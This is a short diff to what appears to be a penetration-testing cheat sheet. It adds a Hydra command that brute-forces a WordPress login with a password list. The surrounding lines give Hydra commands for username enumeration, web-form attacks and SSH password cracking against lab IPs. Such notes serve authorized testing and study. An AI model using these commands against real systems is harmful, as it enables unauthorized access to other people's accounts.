@@ -56,6 +56,7 @@ hydra -l admin -P passwords.txt -t 10 -w 30 <ip> http-form-post "/login-off.asp:
 hydra -vV -L <username_list> -p anything -f 192.168.239.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
 
 --(Determine valid user password):
+hydra -vV -l <username>  -P <password_list> -f 192.168.239.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
 
 Online Password Cracking with Hydra (ex. SSH):
 hydra -L users.txt -P passwords.txt -t 4 -v ssh:// <ip>
